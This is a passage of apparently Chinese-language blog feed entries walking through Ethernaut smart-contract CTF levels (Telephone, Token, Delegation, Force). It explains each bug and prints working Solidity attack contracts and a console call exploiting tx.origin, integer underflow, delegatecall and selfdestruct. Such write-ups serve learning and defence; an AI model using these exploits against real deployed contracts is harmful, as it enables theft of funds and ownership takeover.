class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="receive和fallback的区别"><a href="#receive和fallback的区别" class="headerlink" title="receive和fallback的区别"></a>receive和fallback的区别</h4><p><code>receive</code>和<code>fallback</code>都能够用于接收<code>ETH</code>，他们触发的规则如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">触发fallback() 还是 receive()?</span><br><span class="line">           接收ETH</span><br><span class="line">              |</span><br><span class="line">         msg.data是空？</span><br><span class="line">            /  <span class="string">\</span></span><br><span class="line">          是    否</span><br><span class="line">          /      <span class="string">\</span></span><br><span class="line">receive()存在?   fallback()</span><br><span class="line">        / <span class="string">\</span></span><br><span class="line">       是  否</span><br><span class="line">      /     <span class="string">\</span></span><br><span class="line">receive()   fallback()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单来说，合约接收<code>ETH</code>时，<code>msg.data</code>为空且存在<code>receive()</code>时，会触发<code>receive()</code>；<code>msg.data</code>不为空或不存在<code>receive()</code>时，会触发<code>fallback()</code>，此时<code>fallback()</code>必须为<code>payable</code>。</p><p><code>receive()</code>和<code>payable fallback()</code>均不存在的时候，向合约发送<code>ETH</code>将会报错。</p><p>我们再来看 Force 合约，这里只定义了合约，没有定义 <code>receive</code> 和 <code>fallback</code> 方法，到这里从调用不存在的合约方法触发 fallback 走不通，那还有没有其他方法可以往一个合约转账，还真有一个方法 <code>selfdestruct</code> 。</p><p><code>selfdestruct</code>命令可以用来删除智能合约，并将该合约剩余<code>ETH</code>转到指定地址。<code>selfdestruct</code>是为了应对合约出错的极端情况而设计的。</p><p><code>selfdestruct</code>使用起来非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selfdestruct(address payable recipient)</span><br></pre></td></tr></table></figure><p>其中<code>recipient</code>是接收合约中剩余<code>ETH</code>的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract DeleteContract &#123;</span><br><span class="line"></span><br><span class="line">    uint public value = 10;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function deleteContract() external &#123;</span><br><span class="line">        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns(uint balance)&#123;</span><br><span class="line">        balance = address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>instance</code>；</p></li><li><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，创建文件 <code>7_Force.sol</code>，粘贴以下代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract HackForce &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) payable &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function give() external payable &#123;</span><br><span class="line">        selfdestruct(payable(levelInstance));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在constructor 填入当前关卡合约实例地址后部署。<code>VALUE</code> 填入任意值。</p></li><li><p>再调用 <code>give</code> 函数，完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在solidity中，如果一个合约要接受 ether，fallback 方法必须设置为 <code>payable</code>。</p><p>但是，并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 <code>address(this).balance == 0</code> 之上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Chain: Goerli&lt;br&gt;Difficulty: ●●●○○&lt;br&gt;Level: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x20B5c742dD8A63400644Ba85dd48E8FDB6908A7A</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>6. Delegation</title>
    <link href="https://chaosky.tech/2022/11/01/6-Delegation/"/>
    <id>https://chaosky.tech/2022/11/01/6-Delegation/</id>
    <published>2022-11-01T17:34:48.000Z</published>
    <updated>2022-11-01T17:34:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chain: Goerli<br>Difficulty: ●●○○○<br>Level: <a href="https://ethernaut.openzeppelin.com/level/0x31C4D3a9e0ED12A409cF3C84ad145331aB487D3F">https://ethernaut.openzeppelin.com/level/0x31C4D3a9e0ED12A409cF3C84ad145331aB487D3F</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>这一关的目标是申明你对你创建实例的所有权.</p><p>这可能有帮助</p><ul><li>仔细看solidity文档关于 <code>delegatecall</code> 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.</li><li>Fallback 方法</li><li>方法 ID</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们根据解题提示和分析合约，有3个知识点。以下内容引用自：<a href="https://wtf.academy/">WTF Academy</a></p><h4 id="delegatecall-和-call"><a href="#delegatecall-和-call" class="headerlink" title="delegatecall 和 call"></a><code>delegatecall</code> 和 <code>call</code></h4><p><code>delegatecall</code>与<code>call</code>类似，是<code>solidity</code>中地址类型的低级成员函数。</p><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>语境</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/2022/11/01/6-Delegation/call.png"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/2022/11/01/6-Delegation/delegatecall.png"></p><p>大家可以这样理解：一个<code>富商</code>把它的资产（<code>状态变量</code>）都交给一个<code>VC</code>代理（<code>目标合约</code>的函数）来打理。执行的是<code>VC</code>的函数，但是改变的是<code>富商</code>的状态。</p><p><code>delegatecall</code>语法和<code>call</code>类似，也是：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.delegatecall(二进制编码)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>其中<code>二进制编码</code>利用结构化编码函数<code>abi.encodeWithSignature</code>获得：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi<span class="selector-class">.encodeWithSignature</span>(<span class="string">&quot;函数签名&quot;</span>, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><p><code>函数签名</code>为<code>&quot;函数名（逗号分隔的参数类型)&quot;</code>。例如<code>abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</code>。</p><p>和<code>call</code>不一样，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额</p><blockquote><p>注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p></blockquote><h4 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h4><p><code>fallback()</code>函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约<code>proxy contract</code>。<code>fallback()</code>声明时不需要<code>function</code>关键字，必须由<code>external</code>修饰，一般也会用<code>payable</code>修饰，用于接收ETH:<code>fallback() external payable &#123; ... &#125;</code>。</p><p>我们定义一个<code>fallback()</code>函数，被触发时候会释放<code>fallbackCalled</code>事件，并输出<code>msg.sender</code>，<code>msg.value</code>和<code>msg.data</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// fallback</span><br><span class="line">fallback() external payable&#123;</span><br><span class="line">    emit fallbackCalled(msg.sender, msg.value, msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方法-ID"><a href="#方法-ID" class="headerlink" title="方法 ID"></a>方法 ID</h4><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><code>Solidity</code>中，<code>ABI编码</code>有4个函数：<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSignature</code>, <code>abi.encodeWithSelector</code>。而<code>ABI解码</code>有1个函数：<code>abi.decode</code>，用于解码<code>abi.encode</code>的数据。</p><h5 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a>abi.encode</h5><p>将给定参数利用<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html">ABI规则</a>编码。<code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encode(x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a>abi.encodePacked</h5><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodePacked() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodePacked(x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a>abi.encodeWithSignature</h5><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address)&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>等同于在<code>abi.encode</code>编码结果前加上了4字节的<code>函数选择器</code>。 说明: 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用。</p><h5 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a>abi.encodeWithSelector</h5><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们再来分析下合约，就很明了。通过触发合约的 <code>fallback</code> 调用 <code>delegatecall</code> 执行 <code>pwn</code> 方法，就可以将合约的<code>owner</code>更改为 <code>player</code>。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>contract</code>；</p></li><li><p>执行JS，调用sendTransaction：</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">data</span>: web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(<span class="string">&#x27;pwn()&#x27;</span>)&#125;);</span><br></pre></td></tr></table></figure></li><li><p>最后提交，本关完成。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>使用<code>delegatecall</code> 是很危险的，而且历史上已经多次被用于进行 attack vector。使用它，你对合约相当于在说 “看这里， 其他合约或是其它库，来对我的状态为所欲为吧”。代理对你合约的状态有完全的控制权。 <code>delegatecall</code> 函数是一个很有用的功能，但是也很危险，所以使用的时候需要非常小心。</p><p>请参见 <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a> 这篇文章, 他详细解释了这个方法是如何窃取三千万美元的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Chain: Goerli&lt;br&gt;Difficulty: ●●○○○&lt;br&gt;Level: &lt;a href=&quot;https://ethernaut.openzeppelin.com/level/0x31C4D3a9e0ED12A409cF3C84ad145331aB487D3F</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>5. Token</title>
    <link href="https://chaosky.tech/2022/10/26/5-Token/"/>
    <id>https://chaosky.tech/2022/10/26/5-Token/</id>
    <published>2022-10-26T10:19:43.000Z</published>
    <updated>2022-10-26T10:19:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Chain</strong>: Goerli<br><strong>Difficulty</strong>: ●●○○○<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0xDc0c34CFE029b190Fc4A6eD5219BF809F04E57A3">https://ethernaut.openzeppelin.com/level/0xDc0c34CFE029b190Fc4A6eD5219BF809F04E57A3</a></p><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>这一关的目标是攻破下面这个基础 token 合约<br>你最开始有20个 token，如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好。<br>这可能有帮助:<br>什么是 odometer?</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到 <code>transfer</code> 函数的require 检查代码：</p><p><code>require(balances[msg.sender] - _value &gt;= 0);</code> </p><p>由于 <code>balances[msg.sender]</code> 和 <code>_value</code> 都是 <code>uint</code> 类型，<code>balances[msg.sender] - _value</code> 的结果也是 <code>uint</code> ，作为无符号整数永远是大于等于 0 的，导致我们可以任意取款。正确的写法是 <code>require(balances[msg.sender] &gt;= _value)</code> 。</p><p>找到入侵点后，接下来再分析数据。</p><p>当前token数：</p><ul><li>totalSupply: 21000000</li><li>player: 20</li><li>level: 20999980</li></ul><p>题目中提到数量越多越好，<code>balances</code> 的类型是 <code>uint</code> ，最大值为<code>2**256 -1</code>，因此我们需要将value 变为最大值即可。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>instance</code>；</p></li><li><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，创建文件 <code>5_Token.sol</code>，粘贴以下代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IToken &#123;</span><br><span class="line">    function transfer(address _to, uint256 _value) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackToken &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line"></span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim() public &#123;</span><br><span class="line">        IToken(levelInstance).transfer(msg.sender, type(uint256).max - 20);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 其中<code>value</code>的值为 <code>type(uint256).max - 20</code> 。</p></li><li><p>在constructor 填入当前关卡合约实例地址后部署。</p></li><li><p>再调用 <code>claim</code> 函数，完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>EVM 的整数有 <code>int</code> 和 <code>uint</code> 两种，对应有无符号的情况。在 <code>int</code> 或 <code>uint</code> 后可以跟随一个 8 的倍数，表示该整数的位数，如 8 位的 <code>uint8</code>。位数上限为 256 位，<code>int</code> 和 <code>uint</code> 分别是 <code>int256</code> 和 <code>uint256</code> 的别名，一般 <code>uint</code> 使用的更多。</p><p>在整数超出位数的上限或下限时，就会静默地进行取模操作。通常我们希望费用向上溢出变小，或者存款向下溢出变大。整数溢出漏洞可以使用 SafeMath 库来防御，当发生溢出时会回滚交易。</p><p>Overflow 在 solidity 中非常常见, 你必须小心检查, 比如下面这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(a + c &gt; a) &#123;</span><br><span class="line">  a = a + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另一个简单的方法是使用 OpenZeppelin 的 SafeMath 库, 它会自动检查所有数学运算的溢出, 可以像这样使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = a.add(c);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果有溢出，代码会自动恢复。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Chain&lt;/strong&gt;: Goerli&lt;br&gt;&lt;strong&gt;Difficulty&lt;/strong&gt;: ●●○○○&lt;br&gt;&lt;strong&gt;Level&lt;/strong&gt;: &lt;a href=&quot;https://ethernaut.openzeppelin.c</summary>
      
    
    
    
    <category term="Web3" scheme="https://chaosky.tech/categories/Web3/"/>
    
    
    <category term="ethernaut" scheme="https://chaosky.tech/tags/ethernaut/"/>
    
  </entry>
  
  <entry>
    <title>4. Telephone</title>
    <link href="https://chaosky.tech/2022/10/11/4-Telephone/"/>
    <id>https://chaosky.tech/2022/10/11/4-Telephone/</id>
    <published>2022-10-11T15:32:08.000Z</published>
    <updated>2022-10-11T15:32:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Chain</strong>: Goerli<br><strong>Difficulty</strong>: ●○○○○<br><strong>Level</strong>: <a href="https://ethernaut.openzeppelin.com/level/0x466BDd41a04473A01031C9D80f61A9487C7ef488">https://ethernaut.openzeppelin.com/level/0x466BDd41a04473A01031C9D80f61A9487C7ef488</a></p><h3 id="通关要求"><a href="#通关要求" class="headerlink" title="通关要求"></a>通关要求</h3><p>创建当前关卡合约实例后，调用 <code>await contract.owner()</code> 发现 owner 并不是当前钱包地址。那通过要求就是将 <code>owner</code> 变更为当前钱包。</p><h3 id="分析合约"><a href="#分析合约" class="headerlink" title="分析合约"></a>分析合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>constructor</code> 构造函数中可以看出，owner 是通过 <code>msg.sender</code> 进行初始化。</p><p>在 <code>changeOwner</code> 函数中只有 <code>tx.origin</code> 和 <code>msg.sender</code> 不相等时，才将 <code>owner</code> 赋值。</p><p>至此，引出两个不同的变量 <code>tx.origin</code> 和 <code>msg.sender</code> ：</p><p><code>tx.origin</code>： 指调用智能合约功能的账户地址，只有账户地址可以是 <code>tx.origin</code></p><p><code>msg.sender</code> ：指直接调用智能合约功能的帐户或智能合约的地址。</p><p>当以智能合约调用智能合约时，<code>msg.sender</code> 在被调用的智能合约中，会是调用者智能合约的地址，而 <code>tx.origin</code> 则是最初调用智能合约的个人钱包地址。</p><p>所以，在创建当前关卡合约实例时，是通过关卡合约进行创建，当部署 <code>Telephone</code> 这个合约时，<code>msg.sender</code> 的值为当前关卡合约地址，而不是当前钱包地址。</p><h3 id="解题实现"><a href="#解题实现" class="headerlink" title="解题实现"></a>解题实现</h3><ol><li><p>首先打开Console，获取当前关卡合约实例地址 <code>instance</code>；</p></li><li><p>打开 <a href="https://remix.ethereum.org/">Remix IDE</a>，创建文件 <code>Telephone.sol</code>，粘贴以下代码：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface ITelephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address levelInstance;</span><br><span class="line">    </span><br><span class="line">    constructor(address _levelInstance) &#123;</span><br><span class="line">        levelInstance = _levelInstance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner() public &#123;</span><br><span class="line">        ITelephone(levelInstance).changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在constructor 填入当前关卡合约实例地址后部署。</p></li><li><p>再调用 <code>changeOwner</code> 函数，完成关卡。</p></li></ol><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这个例子比较简单, 混淆 <code>tx.origin</code> 和 <code>msg.sender</code> 会导致 phishing-style 攻击, 比如<a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/">this</a>.</p><p>下面描述了一个可能的攻击.</p><ol><li><p>使用 <code>tx.origin</code> 来决定转移谁的token, 比如.</p> <figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint _value) &#123;</span><br><span class="line">  <span class="built_in">tokens</span>[tx.<span class="built_in">origin</span>] -= _value;</span><br><span class="line">  <span 